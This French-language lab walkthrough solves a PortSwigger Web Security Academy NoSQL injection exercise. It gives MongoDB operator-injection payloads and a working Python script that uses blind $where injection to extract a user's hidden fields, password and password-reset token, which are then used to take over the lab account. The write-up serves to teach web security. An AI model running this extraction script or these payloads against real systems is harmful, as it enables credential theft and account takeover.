# Lab

https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields

## Solution

On doit se connecter avec l'utilisateur `carlos`.

Il y a une page de login qui utilise certainement une base de données NoSQL MongoDB puisque la body de la requête de connexion est la suivante :

```json
{
    "username": "carlos",
    "password": "password"
}
```

Instinctivement, on va essayer de faire une injection NoSQL avec le payload suivant :

```json
{
    "username": "carlos",
    "password": {"$ne": "password"}
}
```

Cela n'a pas fonctionné et en plus ça a bloqué le compte de Carlos.

Pour le débloquer, on doit réinitialiser le mot de passe.

NB : Le fait de réinitialiser le mot de passe de carlos ajoute en base de données un champ `resetPassword` sur l'objet de l'utilisateur avec un token.

Sur la pager de connexion on va essayer d'injecter une condition `where` pour voir si l'application réagit :

```json
{
    "username": "carlos",
    "password": {"$ne": ""},
    "$where": "1"
}
```

Sur la page on voit en retour `Invalid password`.

Maintenant en essayant avec :

```json
{
    "username": "carlos",
    "password": {"$ne": ""},
    "$where": "0"
}
```

On voit que le contenu de la page a changé et qu'il est maintenant affiché `Account locked`.

La condition est donc bien interpretée. A partir de ce constat, on peut commencer à faire une injection NoSQL basée sur les erreurs.

On va, dans l'ordre :

- Determiner le nombre de champs qu'il y a dans l'objet utilisateur de carlos
- Determiner la longueur des noms des champs
- Extraitre les noms des champs
- Determiner la longueur des valeurs des champs
- Extraire les valeurs des champs

Voici le POC Python :

```python
import requests

LAB_URL = "https://0aa700bd03fd6cd0831a2ded00b00042.web-security-academy.net"
LOGIN_ENDPOINT = "/login"
COOKIES = {"session": "AHcRgf5jcW5BZ07IFmzEIRdcnUcjrDNd"}
USERNAME = "carlos"
PAYLOADS = {
    "GET_NB_FIELDS": "Object.keys(this)[{}]!=null",
    "GET_FIELD_NAME_LENGTH": "Object.keys(this)[{}].length=={}",
    "GET_FIELD_NAME": "Object.keys(this)[{}][{}] == '{}'",
    "GET_FIELD_LENGTH": "this.{}.length == {}",
    "GET_FIELD_VALUE": "this.{}[{}] == '{}'"
}
BODY = {"password": {"$ne": ""}, "username": USERNAME}
DICTIONARY = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{};:,./<>?|\\\"'`~"

def extract_feilds():
    lock_account()
    nb_fields = extract_nb_fields()
    feilds_name = extract_field_name(nb_fields)
    feilds = extract_field_value(feilds_name)
    return feilds

def lock_account():
    requests.post(LAB_URL + LOGIN_ENDPOINT, cookies=COOKIES, json=BODY)

def extract_nb_fields(nb_to_test=100):
    for i in range(nb_to_test):
        payload = PAYLOADS["GET_NB_FIELDS"].format(i)
        body = BODY.copy()
        body["$where"] = payload
        response = requests.post(LAB_URL + LOGIN_ENDPOINT, cookies=COOKIES, json=body)
        if "Invalid username or password" in response.text:
            return i + 1
        
def extract_field_name(nb_fields, max_feild_name_length=100):
    fields_name = []
    for i in range(nb_fields):
        for j in range(1, max_feild_name_length):
            payload = PAYLOADS["GET_FIELD_NAME_LENGTH"].format(i, j)
            body = BODY.copy()
            body["$where"] = payload
            response = requests.post(LAB_URL + LOGIN_ENDPOINT, cookies=COOKIES, json=body)
            if "Account locked" in response.text:
                fields_name.append("")
                for k in range(j):
                    for c in DICTIONARY:
                        payload = PAYLOADS["GET_FIELD_NAME"].format(i, k, c)
                        body = BODY.copy()
                        body["$where"] = payload
                        response = requests.post(LAB_URL + LOGIN_ENDPOINT, cookies=COOKIES, json=body)
                        if "Account locked" in response.text:
                            fields_name[i] += c
                            break        
    return fields_name

def extract_field_value(fields_name, max_field_value_length=100):
    fields = {}
    for field_name in fields_name:
        for i in range(1, max_field_value_length):
            payload = PAYLOADS["GET_FIELD_LENGTH"].format(field_name, i)
            body = BODY.copy()
            body["$where"] = payload
            response = requests.post(LAB_URL + LOGIN_ENDPOINT, cookies=COOKIES, json=body)
            if "Account locked" in response.text:
                fields[field_name] = ""
                for j in range(i):
                    for c in DICTIONARY:
                        payload = PAYLOADS["GET_FIELD_VALUE"].format(field_name, j, c)
                        body = BODY.copy()
                        body["$where"] = payload
                        response = requests.post(LAB_URL + LOGIN_ENDPOINT, cookies=COOKIES, json=body)
                        if "Account locked" in response.text:
                            fields[field_name] += c
                            break
                break
    return fields

print(extract_feilds())
```

```json
{
    "username": "carlos",
    "password": "yrtu5jvq1bq1his588a7",
    "passwordReset": "fc6bef5458b56bc6"
}
```

Mais on ne sait pas où utiliser ce token.

On peut essayer sur la page de login en le mettant en query string mais rien ne se passe.

En le mettant sur en query string de la page de réinitialisation du mot de passe, on voit qu'on a la possibilité de le réinitialiser.